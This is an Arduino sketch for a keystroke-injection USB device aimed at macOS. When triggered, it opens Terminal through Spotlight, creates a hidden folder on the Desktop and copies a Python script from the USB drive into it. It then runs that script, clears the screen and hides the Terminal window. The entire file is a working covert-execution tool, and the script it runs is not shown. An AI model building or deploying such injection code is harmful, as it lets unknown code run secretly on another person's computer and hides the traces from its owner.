#include <Keyboard.h>

int stopper;          

void setup() {
    Keyboard.begin();       
    pinMode(2, INPUT);     
}
void loop() {
    stopper = digitalRead(2);  
    if (stopper == HIGH){      
        delay(500);
        Keyboard.press(KEY_LEFT_GUI);        
        Keyboard.press(0x20);               //Command + Spacebar to open spotlight
        Keyboard.releaseAll();
        delay(1000);

        Keyboard.print("Terminal");        
        delay(500);
        Keyboard.press(KEY_RETURN);           //  Open Terminal
        Keyboard.releaseAll();
        delay(500);

        Keyboard.press(KEY_TAB);             
        Keyboard.releaseAll();
        Keyboard.press(KEY_RETURN);       //Tab and return just in case it asks to open an old terminal session
        Keyboard.releaseAll();
        delay(3000);

        Keyboard.print("mkdir ~/Desktop/.py");    //Make a hidden directory on the Desktop
        delay(500);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(500);
        Keyboard.print("cp `find /Volumes -name 'autorun_script.py' -maxdepth 2` ~/Desktop/.py/autorun_script.py");
        delay(1000);       //copies the script from the USB to the hidden dir
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(500);
        Keyboard.print("python ~/Desktop/.py/autorun_script.py && clear");  //Runs the script
        delay(500);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        Keyboard.press(KEY_LEFT_GUI);    //Hides the Terminal window with Command + H
        Keyboard.press('h');
        Keyboard.releaseAll();
        
    }
    else{
        delay(1);
    }
}
